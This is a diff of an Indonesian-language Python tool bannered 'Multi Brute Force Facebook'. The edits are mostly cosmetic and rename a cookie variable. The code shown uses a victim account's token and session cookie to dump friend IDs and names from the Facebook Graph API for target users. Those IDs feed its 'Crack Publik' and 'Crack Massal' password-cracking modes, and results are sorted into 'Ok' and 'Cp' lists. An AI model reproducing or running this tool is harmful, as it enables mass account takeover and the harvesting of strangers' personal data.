@@ -178,9 +178,9 @@ def banner():
       \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
      \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
   \t/ _, _/ /_/ / / _, _/  __/ /__/ /_/ / /_/ /  __/ /    
-/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
+\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
 \t\t• {m}Multi Brute Force Facebook{xxx} •
-\t\t {u}author by {K}RulRecoder''')
+\t\t    {u}author by {K}RulRecoder\n''')
 #kukis
 def login3():
 	try:
@@ -261,8 +261,8 @@ def menu():
 		os.system('clear')
 		login3()
 		banner()
-	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green] {nama} [white]] \n[[cyan]•[white]] Idz Tumbal [white][[green] {uidfb} [white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold white"))
-	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green] ON [white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result Cp [[green] ON [white]]\n[[cyan]04[white]] Result Ok [white][[green] ON [white]] \n[[cyan]00[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
+	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green] {nama} [white]] \n[[cyan]•[white]] Idz Tumbal [white][[green] {uidfb} [white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold green"))
+	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green] ON [white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result Cp [[green] ON [white]]\n[[cyan]04[white]] Result Ok [white][[green] ON [white]] \n[[cyan][red]00[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold green"))
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
 	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
@@ -278,7 +278,7 @@ def menu():
 	elif CYXIEON_GANTENG in ['00','0']:
             ganti_cokies()
 
-#
+#----------[ CRACK-MASSAL ]----------#    
 def dump_massal():
 	try:
 		token = open('.token.txt','r').read()
@@ -295,7 +295,7 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] RULXD [/]]",style=f"bold white"))
+		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] RULXD [/]]",style=f"bold green"))
 		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
@@ -317,7 +317,7 @@ def dump_massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cookie}).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -329,7 +329,7 @@ def dump_massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try: 
-	      prints(panel(f" sedanng mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]RULXD[/]]",style=f"bold white"))
+	      prints(panel(f" sedanng mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]RULXD[/]]",style=f"bold green"))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -361,13 +361,13 @@ def dump(idt,fields,cookie,token):
 				"access_token": token,
 				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
 			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cok).json()
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
 			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
-		dump(idt,url["friends"]["paging"]["cursors"]["after"],cok,token)
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
 	      
 
